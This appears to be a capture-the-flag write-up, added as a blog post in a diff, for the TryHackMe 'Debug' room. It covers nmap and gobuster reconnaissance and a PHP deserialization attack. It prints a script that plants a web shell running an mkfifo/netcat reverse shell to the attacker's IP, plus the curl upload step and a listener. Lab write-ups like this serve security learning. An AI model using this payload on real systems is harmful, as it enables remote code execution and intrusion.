@@ -1,0 +1,92 @@
+---
+title: Debug
+layout: post
+author: Bit Criminals Team
+date: 2021-06-11 12:07:00 +0530
+type: Pentesting
+difficulty: Medium
+prompt: https://tryhackme.com/room/debug
+---
+
+First, connect to TryHackMe using OpenVPN (or use the AttackBox if you prefer that)start the machine from tryhackme, wait for one minute so that the IP Address shows. Now, we are reading to do our hacking!
+
+## TASK 1
+
+The task is to deploy the box, which we have already done. So click on **Completed** and move on.
+
+## TASK 2
+
+First, let's do a basic nmap scan:
+```shell
+nmap -Pn -A <machine_ip>
+```
+
+![](/images/v1per/Debug_1.png)
+
+So, we get 2 open ports: **Port 22 (SSH)** and **Port 80 (HTTP)**
+
+We can see that there's a web-server open, so let's visit the website.
+**http://<machine_ip>:80**
+
+![](/images/v1per/Debug_2.png)
+
+It's an Apache2 Ubuntu Default page. Nothing much in here. Let's run gobuster in directory busting mode to find some hidden directories.
+
+```shell
+gobuster dir -u <box_ip> -w /usr/share/wordlists/dirb/common.txt -z -x html,txt,php
+```
+
+![](/images/v1per/Debug_3.png)
+
+We find a **/backup** directory. Let's visit it: **http://<machine_ip>:80/backup**
+
+![](/images/v1per/Debug_4.png)
+
+The file which stands out here is the **index.php.bak** (backup files always contain something fishy). Let's download it and see it's contents.
+This part stood out:
+
+![](/images/v1per/Debug_5.png)
+
+So, our best guess at this moment is a PHP Deserialization attack. 
+Note that we also found a **/index.php** from gobuster. Visiting it, we see a Form Submit area. 
+
+![](/images/v1per/Debug_6.png)
+
+Filling it with arbitrary values and submitting it, we see that it gets displayed in **http://<machine_ip>:80/message.txt**, which is what the PHP file we found is doing. I wrote this PHP code for the attack (replace <your_tun0_ip> with, well, what it says):
+
+```php
+<?php
+class FormSubmit{
+        public $form_file = 'lol.php';
+        public $message = '<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_tun0_IP> 1234 >/tmp/f"); ?>';
+}
+$obj = new FormSubmit();
+echo urlencode(serialize($obj));
+?>
+```
+
+Now, run the PHP file using:
+```shell
+php <your_php_file.php>
+```
+
+![](/images/v1per/Debug_7.png)
+
+Copy this output, and run the following command to upload our payload:
+```shell
+curl -i http://<machine_ip>:80/index.php?debug=<copied_text>
+```
+or just visit the following website:
+**http://<machine_ip>:80/index.php?debug=<copied_text>**
+
+![](/images/v1per/Debug_8.png)
+
+Now, let's set up a netcat listener on our terminal:
+```shell
+nc -lnvp 1234
+```
+and navigate to **http://<machine_ip>:80/lol.php**.
+And YAY! We have got our shell!
+
+![](/images/v1per/Debug_9.png)
+
